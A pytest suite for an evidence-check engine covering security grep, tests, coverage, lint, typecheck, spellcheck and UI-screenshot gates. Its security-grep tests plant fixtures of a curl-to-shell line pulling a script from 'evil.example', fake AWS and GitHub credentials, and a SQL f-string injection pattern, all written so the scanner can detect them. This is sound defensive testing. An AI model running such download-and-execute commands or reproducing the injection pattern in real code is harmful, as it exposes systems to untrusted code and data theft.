"""Tests for core/governance/evidence_checks.py — evidence check engine.

PR-4 evidence Quality Gate. All projects are tmp_path fixtures; heavy
subprocesses are either trivially fast real commands (python3 -c) or
monkeypatched. Never touches ~/.arkaos or this repo's own suite.
"""

import json
import os
import subprocess
import sys
import time

from core.governance import evidence_checks
from core.governance.evidence_checks import (
    ALL_CHECKS,
    UI_SCREENSHOT_WINDOW_HOURS,
    CheckResult,
    EvidenceReport,
    _check_ui_screenshot,
    _derive_overall,
    main,
    run_evidence_checks,
)

# ─── Fixture projects ───────────────────────────────────────────────────


def _write_coverage_xml(project, line_rate: float) -> None:
    (project / "coverage.xml").write_text(
        f'<?xml version="1.0"?>\n<coverage line-rate="{line_rate}" '
        'branch-rate="0.8"></coverage>\n',
        encoding="utf-8",
    )


def _result(report: EvidenceReport, check: str) -> CheckResult:
    return next(r for r in report.results if r.check == check)


# ─── security-grep ──────────────────────────────────────────────────────


def test_security_grep_flags_fake_secret(tmp_path):
    bad = tmp_path / "settings.py"
    bad.write_text(
        'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\npassword = "hunter22"\n',
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["settings.py"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.ran is True
    assert result.passed is False
    assert "settings.py:1" in result.summary
    assert "aws-access-key" in result.summary
    assert report.overall == "fail"


def test_security_grep_passes_clean_file(tmp_path):
    clean = tmp_path / "service.py"
    clean.write_text("def handler():\n    return 1\n", encoding="utf-8")
    report = run_evidence_checks(
        tmp_path, changed_files=["service.py"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.ran is True
    assert result.passed is True
    assert report.overall == "pass"


def test_security_grep_detects_curl_pipe_and_sql_fstring(tmp_path):
    bad = tmp_path / "deploy.sh"
    bad.write_text("curl https://evil.example/install.sh | sh\n", encoding="utf-8")
    sql = tmp_path / "repo.py"
    sql.write_text('cursor.execute(f"SELECT * FROM t WHERE id={x}")\n', encoding="utf-8")
    report = run_evidence_checks(
        tmp_path,
        changed_files=["deploy.sh", "repo.py"],
        checks=["security-grep"],
    )
    summary = _result(report, "security-grep").summary
    assert "curl-pipe-shell" in summary
    assert "sql-fstring-interpolation" in summary


def _git(project, *args):
    import subprocess

    subprocess.run(
        ["git", *args], cwd=project, capture_output=True, check=True,
        env={"PATH": "/usr/bin:/bin:/usr/local/bin",
             "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
             "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t",
             "HOME": str(project)},
    )


def test_security_grep_is_diff_aware_in_a_git_repo(tmp_path):
    """Pre-existing patterns on the base branch are master's debt, not
    this change's (QG blocker, PR1 Interaction Reform): only ADDED
    lines are scanned when git can provide a diff."""
    _git(tmp_path, "init", "-b", "master")
    legacy = tmp_path / "install.sh"
    legacy.write_text(
        "# docs: curl https://example.com/install.sh | bash\n",
        encoding="utf-8",
    )
    _git(tmp_path, "add", "install.sh")
    _git(tmp_path, "commit", "-m", "base")
    _git(tmp_path, "checkout", "-b", "feature")
    legacy.write_text(
        "# docs: curl https://example.com/install.sh | bash\n"
        "echo 'new harmless line'\n",
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["install.sh"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is True, result.summary
    assert "added-lines" in result.command


def test_security_grep_still_flags_newly_added_patterns(tmp_path):
    _git(tmp_path, "init", "-b", "master")
    script = tmp_path / "deploy.sh"
    script.write_text("echo ok\n", encoding="utf-8")
    _git(tmp_path, "add", "deploy.sh")
    _git(tmp_path, "commit", "-m", "base")
    _git(tmp_path, "checkout", "-b", "feature")
    script.write_text(
        "echo ok\ncurl https://evil.example/install.sh | sh\n",
        encoding="utf-8",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["deploy.sh"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is False
    assert "curl-pipe-shell" in result.summary


def test_security_grep_falls_back_to_whole_file_outside_git(tmp_path):
    # tmp_path is not a git repo → mode is whole-file (fail closed on
    # scan scope, never silently narrower than before).
    bad = tmp_path / "x.sh"
    bad.write_text("curl https://e.example/i.sh | sh\n", encoding="utf-8")
    report = run_evidence_checks(
        tmp_path, changed_files=["x.sh"], checks=["security-grep"],
    )
    result = _result(report, "security-grep")
    assert result.passed is False
    assert "whole-file" in result.command


def test_security_grep_skips_without_changed_files(tmp_path):
    report = run_evidence_checks(tmp_path, checks=["security-grep"])
    result = _result(report, "security-grep")
    assert result.ran is False
    assert result.passed is None
    assert report.overall == "insufficient-evidence"


# ─── tests check (test_command override, real trivial subprocesses) ─────


def test_tests_check_with_passing_override(tmp_path):
    report = run_evidence_checks(
        tmp_path,
        checks=["tests"],
        test_command=f"{sys.executable} -c pass",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is True
    assert result.exit_code == 0
    assert report.overall == "pass"


def test_tests_check_with_failing_override(tmp_path):
    report = run_evidence_checks(
        tmp_path,
        checks=["tests"],
        test_command=f"{sys.executable} -c 'raise SystemExit(2)'",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is False
    assert result.exit_code == 2
    assert report.overall == "fail"


def test_tests_check_timeout_is_clean(tmp_path, monkeypatch):
    def fake_run(*args, **kwargs):
        raise subprocess.TimeoutExpired(cmd=args[0], timeout=1)

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, checks=["tests"], test_command="pytest -q",
    )
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is None
    assert result.summary == "timeout"
    assert report.overall == "insufficient-evidence"


def test_tests_prefers_project_venv_pytest(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n")
    local = tmp_path / ".venv" / "bin"
    local.mkdir(parents=True)
    (local / "pytest").write_text("#!/bin/sh\nexit 0\n")
    calls = []

    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout="ok", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is True
    assert "tests(project-venv)" in result.command
    assert calls[0][0].endswith(".venv/bin/pytest")
    assert len(calls) == 1  # no collect-only probe for the project venv


def test_tests_foreign_pytest_skips_when_collection_fails(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/pytest" if name == "pytest" else None,
    )

    def fake_run(cmd, **kwargs):
        assert "--collect-only" in cmd  # only the probe may run
        return subprocess.CompletedProcess(cmd, 2, stdout="", stderr="ImportError")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is False
    assert result.passed is None
    assert "pin --test-command" in result.summary
    assert report.overall == "insufficient-evidence"


def test_tests_foreign_pytest_runs_when_collection_succeeds(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/pytest" if name == "pytest" else None,
    )
    calls = []

    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout="ok", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is True
    assert result.passed is True
    assert "--collect-only" in calls[0]
    assert "--collect-only" not in calls[1]


def test_tests_foreign_pytest_no_tests_collected_still_runs(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/pytest" if name == "pytest" else None,
    )

    def fake_run(cmd, **kwargs):
        rc = 5 if "--collect-only" in cmd else 0
        return subprocess.CompletedProcess(cmd, rc, stdout="", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is True


def test_tests_probe_timeout_degrades_to_skip(tmp_path, monkeypatch):
    (tmp_path / "mod.py").write_text("x = 1\n")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/pytest" if name == "pytest" else None,
    )

    def fake_run(cmd, **kwargs):
        raise subprocess.TimeoutExpired(cmd=cmd, timeout=1)

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is False
    assert "pin --test-command" in result.summary


def test_tests_check_skips_when_no_runner(tmp_path, monkeypatch):
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    report = run_evidence_checks(tmp_path, checks=["tests"])
    result = _result(report, "tests")
    assert result.ran is False
    assert result.passed is None


# ─── coverage check (parse-only, shared helper) ─────────────────────────


def test_coverage_above_threshold_passes(tmp_path):
    _write_coverage_xml(tmp_path, 0.92)
    report = run_evidence_checks(tmp_path, checks=["coverage"])
    result = _result(report, "coverage")
    assert result.ran is True
    assert result.passed is True
    assert "92.0%" in result.summary
    assert result.details_path == str(tmp_path / "coverage.xml")


def test_coverage_below_threshold_fails(tmp_path):
    _write_coverage_xml(tmp_path, 0.55)
    report = run_evidence_checks(tmp_path, checks=["coverage"])
    assert _result(report, "coverage").passed is False
    assert report.overall == "fail"


def test_coverage_junit_fallback(tmp_path):
    (tmp_path / "junit.xml").write_text(
        '<testsuite name="pytest" errors="0" failures="1" tests="10"/>',
        encoding="utf-8",
    )
    result = _result(run_evidence_checks(tmp_path, checks=["coverage"]), "coverage")
    assert result.ran is True
    assert result.passed is False
    assert "1 failures/errors" in result.summary


def test_coverage_skips_without_artifacts(tmp_path):
    result = _result(run_evidence_checks(tmp_path, checks=["coverage"]), "coverage")
    assert result.ran is False
    assert result.passed is None


# ─── lint / typecheck detection ─────────────────────────────────────────


def test_lint_skips_without_tooling(tmp_path, monkeypatch):
    """No PATH binary AND no importable module (F1 polish: which alone
    no longer means 'no tooling' — the venv module counts)."""
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    monkeypatch.setattr(
        evidence_checks.importlib.util, "find_spec", lambda _: None
    )
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    result = _result(run_evidence_checks(tmp_path, checks=["lint"]), "lint")
    assert result.ran is False
    assert "no lint tooling" in result.summary


def test_lint_runs_ruff_when_available(tmp_path, monkeypatch):
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )
    calls = {}

    def fake_run(cmd, **kwargs):
        calls["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="All checks passed!", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    result = _result(run_evidence_checks(tmp_path, checks=["lint"]), "lint")
    assert result.ran is True
    assert result.passed is True
    assert calls["cmd"][0] == "ruff"


def test_lint_scopes_to_changed_python_files(tmp_path, monkeypatch):
    """Clean changed file in a debt-ridden project must pass — master's
    debt is not this change's."""
    clean = tmp_path / "clean.py"
    clean.write_text("x = 1\n", encoding="utf-8")
    (tmp_path / "legacy_debt.py").write_text("import os,sys\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )
    calls = {}

    def fake_run(cmd, **kwargs):
        calls["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="ok", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, changed_files=["clean.py"], checks=["lint"],
    )
    result = _result(report, "lint")
    assert result.passed is True
    assert calls["cmd"] == ["ruff", "check", "clean.py"]
    assert "lint(scoped: 1 file(s))" in result.command


def test_lint_scoped_fails_on_dirty_changed_file(tmp_path, monkeypatch):
    dirty = tmp_path / "dirty.py"
    dirty.write_text("import os,sys\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )

    def fake_run(cmd, **kwargs):
        return subprocess.CompletedProcess(cmd, 1, stdout="E401", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, changed_files=["dirty.py"], checks=["lint"],
    )
    assert _result(report, "lint").passed is False


def test_lint_without_changed_files_stays_project_wide(tmp_path, monkeypatch):
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )
    calls = {}

    def fake_run(cmd, **kwargs):
        calls["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="ok", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(tmp_path, checks=["lint"])
    result = _result(report, "lint")
    assert calls["cmd"] == ["ruff", "check", "."]
    assert "lint(project-wide)" in result.command


def test_lint_skips_when_changed_files_not_lintable(tmp_path, monkeypatch):
    doc = tmp_path / "README.md"
    doc.write_text("# docs\n", encoding="utf-8")
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["README.md"], checks=["lint"],
    )
    result = _result(report, "lint")
    assert result.ran is False
    assert "no lintable sources" in result.summary


def test_lint_scopes_to_changed_js_files_via_local_eslint(tmp_path, monkeypatch):
    eslint = tmp_path / "node_modules" / ".bin" / "eslint"
    eslint.parent.mkdir(parents=True)
    eslint.write_text("#!/bin/sh\n", encoding="utf-8")
    changed = tmp_path / "app.vue"
    changed.write_text("<template/>\n", encoding="utf-8")
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    calls = {}

    def fake_run(cmd, **kwargs):
        calls["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)
    report = run_evidence_checks(
        tmp_path, changed_files=["app.vue"], checks=["lint"],
    )
    result = _result(report, "lint")
    assert result.passed is True
    assert calls["cmd"] == [str(eslint), "app.vue"]
    assert "lint(scoped: 1 file(s))" in result.command


def test_lint_changed_outside_project_dir_falls_back_project_wide(
    tmp_path, monkeypatch,
):
    """Scope containment holds (the outside file is never linted
    directly) but the gate must not go BLIND: a lintable extension in
    the diff falls back to the project-wide run (QG 2026-07-12 — the
    old skip-entirely contract let a 2 .py + 6 .js diff pass unlinted).
    """
    (tmp_path / "module.py").write_text("x = 1\n", encoding="utf-8")
    outside = tmp_path.parent / f"{tmp_path.name}-outside.py"
    outside.write_text("x = 1\n", encoding="utf-8")
    captured = {}

    def fake_run(name, cmd, project_dir, timeout):
        captured["cmd"] = [str(c) for c in cmd]
        return evidence_checks.CheckResult(
            check=name, ran=True, passed=True,
            command=" ".join(str(c) for c in cmd), exit_code=0, summary="ok",
        )

    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/ruff" if name == "ruff" else None,
    )
    monkeypatch.setattr(evidence_checks, "_run", fake_run)
    report = run_evidence_checks(
        tmp_path, changed_files=[str(outside)], checks=["lint"],
    )
    result = _result(report, "lint")
    assert result.ran is True
    assert "project-wide" in result.command
    assert str(outside) not in " ".join(captured["cmd"]), (
        "scope containment: the outside file itself is never linted"
    )


def test_typecheck_skips_without_configuration(tmp_path, monkeypatch):
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    result = _result(
        run_evidence_checks(tmp_path, checks=["typecheck"]), "typecheck",
    )
    assert result.ran is False


def test_typecheck_detects_mypy_config(tmp_path, monkeypatch):
    (tmp_path / "mypy.ini").write_text("[mypy]\n", encoding="utf-8")
    monkeypatch.setattr(
        evidence_checks.shutil, "which",
        lambda name: "/usr/bin/mypy" if name == "mypy" else None,
    )
    monkeypatch.setattr(
        evidence_checks.subprocess, "run",
        lambda cmd, **kw: subprocess.CompletedProcess(cmd, 1, stdout="error: bad", stderr=""),
    )
    result = _result(
        run_evidence_checks(tmp_path, checks=["typecheck"]), "typecheck",
    )
    assert result.ran is True
    assert result.passed is False
    assert "mypy" in result.command


# ─── spellcheck ─────────────────────────────────────────────────────────


def test_spellcheck_skips_without_codespell(tmp_path, monkeypatch):
    """Skip only when codespell is absent BOTH from PATH and as a module.

    Clearing PATH alone is no longer enough to force the skip: an
    importable `codespell_lib` is a valid installation (venv installs
    have no PATH binary), so the module lookup must be stubbed too.
    """
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    monkeypatch.setattr(
        evidence_checks.importlib.util, "find_spec", lambda _name: None,
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["README.md"], checks=["spellcheck"],
    )
    result = _result(report, "spellcheck")
    assert result.ran is False
    assert "codespell" in result.summary


def test_spellcheck_skips_without_md_files(tmp_path, monkeypatch):
    monkeypatch.setattr(
        evidence_checks.shutil, "which", lambda _: "/usr/bin/codespell",
    )
    report = run_evidence_checks(
        tmp_path, changed_files=["module.py"], checks=["spellcheck"],
    )
    assert _result(report, "spellcheck").ran is False


# ─── overall derivation ─────────────────────────────────────────────────


def _cr(check, ran, passed):
    return CheckResult(
        check=check, ran=ran, passed=passed, command="", exit_code=None,
        summary="",
    )


def test_overall_fail_beats_pass():
    results = [_cr("lint", True, True), _cr("tests", True, False)]
    assert _derive_overall(results) == "fail"


def test_overall_pass_requires_a_concluded_check():
    assert _derive_overall([_cr("lint", True, True)]) == "pass"


def test_overall_insufficient_when_nothing_concluded():
    results = [_cr("lint", False, None), _cr("tests", True, None)]
    assert _derive_overall(results) == "insufficient-evidence"


def test_unknown_check_is_skipped(tmp_path):
    report = run_evidence_checks(tmp_path, checks=["nonsense"])
    result = _result(report, "nonsense")
    assert result.ran is False
    assert "unknown check" in result.summary


def test_default_runs_all_checks(tmp_path, monkeypatch):
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _: None)
    report = run_evidence_checks(tmp_path)
    assert [r.check for r in report.results] == list(ALL_CHECKS)


# ─── CLI ────────────────────────────────────────────────────────────────


def test_cli_json_output_and_exit_codes(tmp_path, capsys):
    bad = tmp_path / "leak.py"
    bad.write_text('token = "ghp_0123456789abcdefghijkl"\n', encoding="utf-8")
    exit_code = main([
        str(tmp_path),
        "--checks", "security-grep",
        "--changed-files", "leak.py",
        "--json",
    ])
    payload = json.loads(capsys.readouterr().out)
    assert exit_code == 1
    assert payload["overall"] == "fail"
    assert payload["results"][0]["check"] == "security-grep"


def test_cli_insufficient_evidence_exit_code(tmp_path, capsys):
    exit_code = main([str(tmp_path), "--checks", "security-grep"])
    out = capsys.readouterr().out
    assert exit_code == 2
    assert "overall: insufficient-evidence" in out


def test_cli_pass_exit_code(tmp_path, capsys):
    clean = tmp_path / "ok.py"
    clean.write_text("value = 1\n", encoding="utf-8")
    exit_code = main([
        str(tmp_path),
        "--checks", "security-grep",
        "--changed-files", "ok.py",
        "--json",
    ])
    assert exit_code == 0
    assert json.loads(capsys.readouterr().out)["overall"] == "pass"


# ─── ui-screenshot (Excellence Reform PR-D3) ────────────────────────────


def _png(path, size=20 * 1024, mtime=None):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(b"\x89PNG" + b"\x00" * size)
    if mtime is not None:
        os.utime(path, (mtime, mtime))
    return path


def test_ui_screenshot_skips_without_changed_files(tmp_path):
    result = _check_ui_screenshot(tmp_path, None, None, 30)
    assert not result.ran
    assert "no changed files" in result.summary


def test_ui_screenshot_skips_when_no_ui_files_changed(tmp_path):
    result = _check_ui_screenshot(tmp_path, ["core/state.py"], None, 30)
    assert not result.ran
    assert "no UI files changed" in result.summary


def test_ui_screenshot_fails_when_ui_changed_without_artifact(tmp_path):
    result = _check_ui_screenshot(
        tmp_path, ["app/Hero.vue", "core/state.py"], None, 30
    )
    assert result.ran and result.passed is False
    assert ".arka/evidence/ui" in result.summary
    assert "design-review" in result.summary


def test_ui_screenshot_passes_with_recent_artifact(tmp_path):
    newest = _png(tmp_path / ".arka" / "evidence" / "ui" / "d" / "hero.png")
    result = _check_ui_screenshot(tmp_path, ["app/Hero.vue"], None, 30)
    assert result.ran and result.passed is True
    assert result.details_path == str(newest)
    assert "hero.png" in result.summary


def test_ui_screenshot_rejects_stale_artifact(tmp_path):
    stale = time.time() - (UI_SCREENSHOT_WINDOW_HOURS + 2) * 3600
    _png(tmp_path / ".arka" / "evidence" / "ui" / "old.png", mtime=stale)
    result = _check_ui_screenshot(tmp_path, ["app/Hero.vue"], None, 30)
    assert result.ran and result.passed is False


def test_ui_screenshot_rejects_undersized_artifact(tmp_path):
    _png(tmp_path / ".arka" / "evidence" / "ui" / "tiny.png", size=1024)
    result = _check_ui_screenshot(tmp_path, ["app/Hero.vue"], None, 30)
    assert result.ran and result.passed is False


def test_ui_screenshot_picks_newest_artifact(tmp_path):
    older = time.time() - 3600
    _png(tmp_path / ".arka" / "evidence" / "ui" / "a.png", mtime=older)
    newest = _png(tmp_path / ".arka" / "evidence" / "ui" / "b.png")
    result = _check_ui_screenshot(tmp_path, ["style.css"], None, 30)
    assert result.passed is True
    assert result.details_path == str(newest)


def test_ui_screenshot_failure_fails_overall_report(tmp_path):
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "Hero.vue").write_text("<template/>")
    report = run_evidence_checks(
        tmp_path, changed_files=["app/Hero.vue"],
        checks=["ui-screenshot"],
    )
    assert report.overall == "fail"


# ─── F1 polish: venv-module tool resolution (task #12, QG follow-up) ───


class TestToolCmdResolution:
    def test_path_binary_wins(self, monkeypatch):
        from core.governance import evidence_checks as ec

        monkeypatch.setattr(ec.shutil, "which", lambda t: f"/usr/bin/{t}")
        assert ec._tool_cmd("ruff") == ["ruff"]

    def test_module_fallback_when_no_binary(self, monkeypatch):
        """The false-green fix: venv-installed ruff with no PATH binary
        must still lint Python — never silently downgrade to eslint."""
        import sys as _sys

        from core.governance import evidence_checks as ec

        monkeypatch.setattr(ec.shutil, "which", lambda t: None)
        monkeypatch.setattr(
            ec.importlib.util, "find_spec", lambda t: object()
        )
        assert ec._tool_cmd("ruff") == [_sys.executable, "-m", "ruff"]

    def test_none_when_neither_exists(self, monkeypatch):
        from core.governance import evidence_checks as ec

        monkeypatch.setattr(ec.shutil, "which", lambda t: None)
        monkeypatch.setattr(ec.importlib.util, "find_spec", lambda t: None)
        assert ec._tool_cmd("ruff") is None

    def test_scoped_lint_uses_module_ruff(self, tmp_path, monkeypatch):
        import sys as _sys

        from core.governance import evidence_checks as ec

        (tmp_path / "mod.py").write_text("x = 1\n")
        calls = []

        def fake_run(check, cmd, project_dir, timeout):
            calls.append(cmd)
            return ec.CheckResult(check=check, ran=True, passed=True,
                                  command=" ".join(cmd), exit_code=0,
                                  summary="ok")

        monkeypatch.setattr(ec.shutil, "which", lambda t: None)
        monkeypatch.setattr(ec.importlib.util, "find_spec", lambda t: object())
        monkeypatch.setattr(ec, "_run", fake_run)
        result = ec._lint_scoped(tmp_path, ["mod.py"], timeout=30)
        assert result is not None
        assert calls[0][:3] == [_sys.executable, "-m", "ruff"]


class TestLintScopeBlindSpot:
    """QG 2026-07-12: a diff carrying real .py/.js files got skipped as
    'no lintable sources' because none of the paths resolved under
    project_dir (different checkout/cwd). The skip is only honest when
    the diff has no lintable EXTENSIONS; unresolvable lintable paths
    must fall through to the project-wide lint instead."""

    def test_unresolvable_lintable_paths_fall_through_to_project_wide(
        self, tmp_path, monkeypatch,
    ):
        from core.governance import evidence_checks as ec

        (tmp_path / "real.py").write_text("x = 1\n", encoding="utf-8")
        ran = {}

        def fake_run(name, cmd, project_dir, timeout):
            ran["cmd"] = cmd
            return ec.CheckResult(
                check=name, ran=True, passed=True,
                command=" ".join(map(str, cmd)), exit_code=0, summary="ok",
            )

        monkeypatch.setattr(ec, "_run", fake_run)
        # Hermetic tooling: CI runners carry no ruff/eslint — the test
        # controls availability instead of inheriting the environment's.
        monkeypatch.setattr(ec, "_ruff_cmd", lambda: ["ruff"])
        # Changed files exist in the DIFF but not under project_dir —
        # e.g. new files reviewed from another checkout.
        result = ec._check_lint(
            tmp_path,
            ["ghost/module.py", "ghost/tool.js"],
            None,
            timeout=30,
        )
        assert result.ran, (
            "lintable extensions in the diff must never skip the gate — "
            f"got: {result.summary}"
        )
        assert "ruff" in " ".join(map(str, ran.get("cmd", []))), (
            "fallback must be the project-wide ruff run"
        )

    def test_uppercase_suffix_also_falls_through(self, tmp_path, monkeypatch):
        """QG M1: _suffixes does not case-fold but _scoped_files does —
        an unresolvable ghost/MODULE.PY must fall through like .py."""
        from core.governance import evidence_checks as ec

        (tmp_path / "real.py").write_text("x = 1\n", encoding="utf-8")

        def fake_run(name, cmd, project_dir, timeout):
            return ec.CheckResult(
                check=name, ran=True, passed=True,
                command=" ".join(map(str, cmd)), exit_code=0, summary="ok",
            )

        monkeypatch.setattr(ec, "_run", fake_run)
        monkeypatch.setattr(ec, "_ruff_cmd", lambda: ["ruff"])
        result = ec._check_lint(
            tmp_path, ["ghost/MODULE.PY"], None, timeout=30,
        )
        assert result.ran, "uppercase lintable suffix must not skip blind"

    def test_truly_unlintable_diff_still_skips_honestly(self, tmp_path):
        from core.governance import evidence_checks as ec

        result = ec._check_lint(
            tmp_path, ["README.md", "docs/x.yaml"], None, timeout=30,
        )
        assert not result.ran
        assert "no lintable sources" in result.summary


def test_spellcheck_resolves_codespell_from_interpreter_not_path(tmp_path, monkeypatch):
    """codespell installed in the venv (no PATH binary) must still run.

    QG blocker (redo 2): the check gated on `shutil.which("codespell")`
    while lint/tests resolved the venv by absolute path, so an operator
    with codespell in ~/.arkaos/venv saw `ran=false, "codespell not
    installed"` on three consecutive reviews — the copy gate was dark and
    no install could fix it. Resolution now mirrors _tool_cmd, including
    the import-name difference (the command is `codespell`, the module is
    `codespell_lib`).

    Hermetic: codespell is NOT a declared dev dependency, so the module
    lookup is stubbed rather than relying on it being importable here —
    otherwise this test silently inverts into a skip-path assertion on a
    machine without it (QG blocker, redo 3).
    """
    (tmp_path / "doc.md").write_text("hello\n")
    calls = []

    class _Spec:  # stand-in for an importable codespell_lib
        pass

    monkeypatch.setattr(
        evidence_checks.importlib.util, "find_spec",
        lambda name: _Spec() if name == "codespell_lib" else None,
    )

    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    # No PATH binary anywhere — the exact operator machine state.
    monkeypatch.setattr(evidence_checks.shutil, "which", lambda _tool: None)
    monkeypatch.setattr(evidence_checks.subprocess, "run", fake_run)

    result = evidence_checks._check_spellcheck(tmp_path, ["doc.md"], None, 60)

    assert result.ran is True, "must not skip when codespell is importable"
    assert calls and calls[0][1:3] == ["-m", "codespell_lib"], (
        "must invoke the interpreter's module, not a bare `codespell`"
    )
    assert calls[0][0] == sys.executable
